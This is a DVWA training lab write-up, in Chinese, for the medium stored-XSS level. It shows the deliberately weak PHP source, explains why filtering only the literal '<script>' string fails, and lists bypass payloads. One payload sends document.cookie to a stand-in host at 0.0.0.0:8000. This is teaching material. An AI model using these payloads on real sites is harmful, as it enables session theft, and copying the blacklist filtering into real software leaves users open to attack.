# XSS (Stored) - Medium

## View Source

```PHP
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = str_replace( '<script>', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```

- [`addslashes()`](https://www.php.net/manual/zh/function.addslashes.php)
    - 在特殊字元前添加反斜線 `\`
- [`strip_tags()`](https://www.php.net/manual/zh/function.strip-tags.php)
    - 過濾 *HTML* 和 *PHP* 標籤
- [`htmlspecialchars`](https://www.php.net/manual/zh/function.htmlspecialchars.php)
    - 將特殊字元轉換成 *HTML Entity*

## Code Review

- 針對 *Message* 採取防禦措施
- *Name* 的欄位包含 `<script>` 的部分轉成空字串
- 一樣有前端限制長度和資料庫欄位長度限制

## Answer

- 需要在 *Name* 注入
- 因為是類似黑名單的方法，可以透過大小寫變換等繞過
- 如果 *Payload* 超過前端限制，用 *F12 DevTools* 修改即可

### Example

```
<Script>alert(1)</script>
<scr<script>ipt>alert(1)</script>
<Script>window.open("http://0.0.0.0:8000/?cookie=" + document.cookie)</script>
```